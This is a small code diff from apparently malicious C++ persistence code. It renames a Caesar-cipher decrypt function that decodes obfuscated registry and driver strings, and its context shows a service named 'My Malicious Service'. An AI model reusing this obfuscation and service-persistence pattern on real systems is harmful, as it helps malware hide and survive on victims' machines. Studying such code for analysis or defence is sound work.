@@ -5,8 +5,8 @@
 #include "Obfuscator.h"
 
 Persistence::Persistence() {
-    this->keyPath_str = Utils::StringToWstring(Obfuscator::DecryptCaesar(this->keyPath, 0xDE));
-    this->driverLoaded_str = Utils::StringToWstring(Obfuscator::DecryptCaesar(this->driverLoaded, 0xDE));
+    this->keyPath_str = Utils::StringToWstring(Obfuscator::decryptCaesar(this->keyPath, 0xDE));
+    this->driverLoaded_str = Utils::StringToWstring(Obfuscator::decryptCaesar(this->driverLoaded, 0xDE));
 
     std::wstring serviceName = L"MyMaliciousService";
     std::wstring serviceDisplayName = L"My Malicious Service";
